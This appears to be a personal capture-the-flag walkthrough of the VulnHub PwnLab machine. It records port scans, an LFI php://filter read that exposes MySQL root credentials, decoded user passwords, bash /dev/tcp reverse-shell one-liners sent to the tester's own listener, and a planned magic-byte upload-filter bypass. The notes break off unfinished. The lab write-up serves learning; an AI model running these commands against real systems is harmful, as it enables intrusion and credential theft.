# pwnloab

## Info overview

### Machine

| IP             | Hostname | workgroup | OS | 
|----------------|----------|-----------|----|
| 192.168.56.103 | | | |

### Ports and services

| port                      | Service/URL        | Info  |
|---------------------------|--------------------|-------|
| 80/tcp                    | http apache 2.4.10 <br> some 5.X version of PHP | dir listing images/ upload/ <br> LFI on page param `php://filter/convert.base64-encode/resource` <br> application stores passwords in base64. see login.php | 
| 68/udp                    | dhcpc              | |
| 111/tcp                   | rpcbind            | |
| 111/udp                   | rpcbinv            | |
| 3306/tcp                  | MariaDB (mysql) 5.5.47-0     | |
| 505111/tcp                | rpc                | |

### Users, hashes and Passwords

#### users

| users      |  |  |   |
|------------|------|-----|-----|
|  |  | 

#### passwords

| Creds               | how did i get it                                   | what can it access/info  |
|---------------------|----------------------------------------------------|--------------------------|
| root:H4u%QJ_H99     | php://filter/convert.base64-encode/resource=config | mysql root 
| kent:JWzXuBJJNy     | mysql shell                                        |
| mike:SIfdsTEn6I     | mysql shell                                        |
| kane:iSv5Ym2GRo     | mysql shell                                        |

#### hashes

| user    | hash                               | cracked     |
|---------|------------------------------------|-------------|
| | | 

### Vulns

| Potential Vulns                                                                                                                  | Verified |
|----------------------------------------------------------------------------------------------------------------------------------|----------|
| [MySQL - Root Privilege Escalation PoC Exploit](https://www.exploit-db.com/exploits/40679)                                       | []       |
| [MySQL 5.5.x/5.6.x/5.7.x - 'mysql' System User Privilege Escalation / Race Condition ](https://www.exploit-db.com/exploits/40678)| []       |

## where you at

```
nmap -sn -PR 192.168.56.0/24 -oA scans/arp_scan
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 17:30 CET
Nmap scan report for 192.168.56.1
Host is up (0.00014s latency).
MAC Address: 0A:00:27:00:00:0A (Unknown)
Nmap scan report for 192.168.56.100
Host is up (0.00014s latency).
MAC Address: 08:00:27:61:DA:0A (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.103
Host is up (0.00017s latency).
MAC Address: 08:00:27:D7:49:EB (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.102
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 2.07 seconds

```

## what you got

### TCP

```
# Nmap 7.80 scan initiated Tue Jan  7 17:31:57 2020 as: nmap -p- -A -oA scans/tcp 192.168.56.103
Nmap scan report for 192.168.56.103
Host is up (0.00032s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: PwnLab Intranet Image Hosting
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          41188/udp   status
|   100024  1          50511/tcp   status
|   100024  1          56045/tcp6  status
|_  100024  1          59499/udp6  status
3306/tcp  open  mysql   MySQL 5.5.47-0+deb8u1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.47-0+deb8u1
|   Thread ID: 38
|   Capabilities flags: 63487
|   Some Capabilities: ConnectWithDatabase, Support41Auth, Speaks41ProtocolOld, SupportsTransactions, IgnoreSpaceBeforeParenthesis, SupportsCompression, FoundRows, IgnoreSigpipes, InteractiveClient, Speaks41ProtocolNew, SupportsLoadDataLocal, ODBCClient, LongPassword, LongColumnFlag, DontAllowDatabaseTableColumn, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: 4{3+|PYOb|k$n~QXH@Dw
|_  Auth Plugin Name: mysql_native_password
505r11/tcp open  status  1 (RPC #100024)
MAC Address: 08:00:27:D7:49:EB (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.32 ms 192.168.56.103

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan  7 17:32:14 2020 -- 1 IP address (1 host up) scanned in 18.10 seconds
```

### UDP

``` 
nmap -sU  192.168.56.103 -oA scans/udp
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-07 19:40 CET
Nmap scan report for 192.168.56.103
Host is up (0.00046s latency).
Not shown: 998 closed ports
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
111/udp open          rpcbind
MAC Address: 08:00:27:D7:49:EB (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1095.87 seconds
```

### 192.168.56.103 - 80

dir listing: http://192.168.56.103/images/  

old php version, terminate with null byte. http://192.168.56.103/config%00.php  


### nikto

```
nikto -h 192.168.56.103 -output scans/nikto.txt
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.103
+ Target Hostname:    192.168.56.103
+ Target Port:        80
+ Start Time:         2020-01-07 17:36:33 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ IP address found in the 'location' header. The IP is "127.0.1.1".
+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /images over HTTP/1.0. The value is "127.0.1.1".
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ Cookie PHPSESSID created without the httponly flag
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /login.php: Admin login page/section found.
+ 7915 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2020-01-07 17:37:41 (GMT1) (68 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

#### gobuster

```
root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab# ~/go/bin/gobuster dir -u http://192.168.56.103/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,sql -t 40 -e -o scans/gobuster_dir_med-php-txt-html-sql.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.103/
[+] Threads:        40
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,sql,php,txt
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/07 17:49:15 Starting gobuster
===============================================================
http://192.168.56.103/index.php (Status: 200)
http://192.168.56.103/images (Status: 301)
http://192.168.56.103/upload (Status: 301)
http://192.168.56.103/upload.php (Status: 200)
http://192.168.56.103/login.php (Status: 200)
http://192.168.56.103/config.php (Status: 200)
http://192.168.56.103/server-status (Status: 403)
===============================================================
2020/01/07 17:51:26 Finished
===============================================================
```

#### kadimus

``` 
root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# kadimus -u http://192.168.56.103/?page=login --parameter page --get-source --filename "config" -O config.php --proxy http://127.0.0.1:8080 

(GET /?page=php://filter/convert.base64-encode/resource=config HTTP/1.1)


 _  __         _ _                     
| |/ /__ _  __| (_)_ __ ___  _   _ ___ 
| ' // _` |/ _` | | '_ ` _ \| | | / __|
| . \ (_| | (_| | | | | | | | |_| \__ \
|_|\_\__,_|\__,_|_|_| |_| |_|\__,_|___/

  v1.1 - LFI Scan & Exploit Tool (@hc0d3r - P0cL4bs Team)

[19:37:04] [INFO] trying get source code of file: config
[19:37:04] [INFO] valid base64 returned:                                                                                                                                                                         
[19:37:04] [INFO] check the output file

<?php
$server	  = "localhost";
$username = "root";
$password = "H4u%QJ_H99";
$database = "Users";
?>



root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# kadimus -u http://192.168.56.103/?page=login --parameter page --get-source --filename "login" -O login.php  --proxy http://127.0.0.1:8080 
 _  __         _ _                     
| |/ /__ _  __| (_)_ __ ___  _   _ ___ 
| ' // _` |/ _` | | '_ ` _ \| | | / __|
| . \ (_| | (_| | | | | | | | |_| \__ \
|_|\_\__,_|\__,_|_|_| |_| |_|\__,_|___/

  v1.1 - LFI Scan & Exploit Tool (@hc0d3r - P0cL4bs Team)

[21:18:41] [INFO] trying get source code of file: login
[21:18:41] [INFO] valid base64 returned:
[21:18:41] [INFO] check the output file

<?php
session_start();
require("config.php");
$mysqli = new mysqli($server, $username, $password, $database);

if (isset($_POST['user']) and isset($_POST['pass']))
{
        $luser = $_POST['user'];
        $lpass = base64_encode($_POST['pass']);

        $stmt = $mysqli->prepare("SELECT * FROM users WHERE user=? AND pass=?");
        $stmt->bind_param('ss', $luser, $lpass);

        $stmt->execute();
        $stmt->store_Result();

        if ($stmt->num_rows == 1)
        {
                $_SESSION['user'] = $luser;
                header('Location: ?page=upload');
        }
        else
        {
                echo "Login failed.";
        }
}
else
{
        ?>
        <form action="" method="POST">
        <label>Username: </label><input id="user" type="test" name="user"><br />
        <label>Password: </label><input id="pass" type="password" name="pass"><br />
        <input type="submit" name="submit" value="Login">
        </form>
        <?php
}

root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# kadimus -u http://192.168.56.103/?page=login --parameter page --get-source --filename "upload" -O upload.php  #--proxy http://127.0.0.1:808
 _  __         _ _                     
| |/ /__ _  __| (_)_ __ ___  _   _ ___ 
| ' // _` |/ _` | | '_ ` _ \| | | / __|
| . \ (_| | (_| | | | | | | | |_| \__ \
|_|\_\__,_|\__,_|_|_| |_| |_|\__,_|___/

  v1.1 - LFI Scan & Exploit Tool (@hc0d3r - P0cL4bs Team)

[22:19:17] [INFO] trying get source code of file: upload
[22:19:17] [INFO] valid base64 returned:
[22:19:18] [INFO] check the output file

<?php
session_start();
if (!isset($_SESSION['user'])) { die('You must be log in.'); }
?>
<html>
	<body>
		<form action='' method='post' enctype='multipart/form-data'>
			<input type='file' name='file' id='file' />
			<input type='submit' name='submit' value='Upload'/>
		</form>
	</body>
</html>
<?php 
if(isset($_POST['submit'])) {
	if ($_FILES['file']['error'] <= 0) {
		$filename  = $_FILES['file']['name'];
		$filetype  = $_FILES['file']['type'];
		$uploaddir = 'upload/';
		$file_ext  = strrchr($filename, '.');
		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
		$whitelist = array(".jpg",".jpeg",".gif",".png"); 

		if (!(in_array($file_ext, $whitelist))) {
			die('Not allowed extension, please upload images only.');
		}

		if(strpos($filetype,'image') === false) {
			die('Error 001');
		}

		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
			die('Error 002');
		}

		if(substr_count($filetype, '/')>1){
			die('Error 003');
		}

		$uploadfile = $uploaddir . md5(basename($_FILES['file']['name'])).$file_ext;

		if (move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)) {
			echo "<img src=\"".$uploadfile."\"><br />";
		} else {
			die('Error 4');
		}
	}
}

?>

``` 

## 192.168.56.103 - 3306

```
mysql -u root --host 192.168.56.103
ERROR 1045 (28000): Access denied for user 'root'@'192.168.56.102' (using password: NO)
``` 

## Exploit


### passwords

``` 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 123
Server version: 5.5.47-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> 
MySQL [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| Users              |
+--------------------+
2 rows in set (0.001 sec)

MySQL [(none)]> use Users
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MySQL [Users]> show tables;
+-----------------+
| Tables_in_Users |
+-----------------+
| users           |
+-----------------+
1 row in set (0.001 sec)

MySQL [Users]> select * from users;
+------+------------------+
| user | pass             |
+------+------------------+
| kent | Sld6WHVCSkpOeQ== |
| mike | U0lmZHNURW42SQ== |
| kane | aVN2NVltMkdSbw== |
+------+------------------+
3 rows in set (0.001 sec)

MySQL [(none)]> help;

General information about MariaDB can be found at
http://mariadb.org

List of all MySQL commands:
Note that all text commands must be first on line and end with ';'
?         (\?) Synonym for `help'.
clear     (\c) Clear the current input statement.
connect   (\r) Reconnect to the server. Optional arguments are db and host.
delimiter (\d) Set statement delimiter.
edit      (\e) Edit command with $EDITOR.
ego       (\G) Send command to mysql server, display result vertically.
exit      (\q) Exit mysql. Same as quit.
go        (\g) Send command to mysql server.
help      (\h) Display this help.
nopager   (\n) Disable pager, print to stdout.
notee     (\t) Don't write into outfile.
pager     (\P) Set PAGER [to_pager]. Print the query results via PAGER.
print     (\p) Print current command.
prompt    (\R) Change your mysql prompt.
quit      (\q) Quit mysql.
rehash    (\#) Rebuild completion hash.
source    (\.) Execute an SQL script file. Takes a file name as an argument.
status    (\s) Get status information from the server.
system    (\!) Execute a system shell command.
tee       (\T) Set outfile [to_outfile]. Append everything into given outfile.
use       (\u) Use another database. Takes database name as argument.
charset   (\C) Switch to another charset. Might be needed for processing binlog with multi-byte charsets.
warnings  (\W) Show warnings after every statement.
nowarning (\w) Don't show warnings after every statement.

For server side help, type 'help contents'

MySQL [(none)]> tee
No previous outfile available, you must give a filename!
```

```
root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# echo Sld6WHVCSkpOeQ== | base64 -d
JWzXuBJJNy
root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# echo U0lmZHNURW42SQ== | base64 -d
SIfdsTEn6I
root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# echo aVN2NVltMkdSbw== | base64 -d
iSv5Ym2GRo
```

### mysql shell to local shell

I was today years old when I learned that system command of mysql runs LOCAL not remote.

png

gif


```
root@kali:/mnt/hgfs/my-notes-and-snippets/notes/ctfs/vulnhub/pwnlab/loot# nc -nlvp 808
listening on [any] 808 ...
192.168.56.102: inverse host lookup failed: Unknown host
connect to [192.168.56.102] from (UNKNOWN) [192.168.56.102] 36662  
``` 

``` 
MySQL [(none)]> system
ERROR: Usage: \! shell-command
MySQL [(none)]> system ls
config.php  login.php
MySQL [(none)]> system bash -i >& /dev/tcp/192.168.56.102/808 0>&1
sh: 1: Syntax error: Bad fd number
MySQL [(none)]> system sh -i >& /dev/tcp/192.168.56.102/808 0>&1
sh: 1: Syntax error: Bad fd number
MySQL [(none)]> system bash -c "bash -i >& /dev/tcp/192.168.56.102/808 0>&1"
```

### upload via web

use creds from DB. Login.

upload page checks 3 things.
- Extensions
- image file type with ['type']
- mime data with getimagesize

so upload a shell.jpg.php with a magic byte

```php
		$filename  = $_FILES['file']['name'];
		$filetype  = $_FILES['file']['type'];
		$uploaddir = 'upload/';
		$file_ext  = strrchr($filename, '.');
		$imageinfo = getimagesize($_FILES['file']['tmp_name']);
		$whitelist = array(".jpg",".jpeg",".gif",".png"); 

		if (!(in_array($file_ext, $whitelist))) {
			die('Not allowed extension, please upload images only.');
		}

		if(strpos($filetype,'image') === false) {
			die('Error 001');
		}

		if($imageinfo['mime'] != 'image/gif' && $imageinfo['mime'] != 'image/jpeg' && $imageinfo['mime'] != 'image/jpg'&& $imageinfo['mime'] != 'image/png') {
			die('Error 002');
		}

		if(substr_count($filetype, '/')>1){
			die('Error 003');
        }
```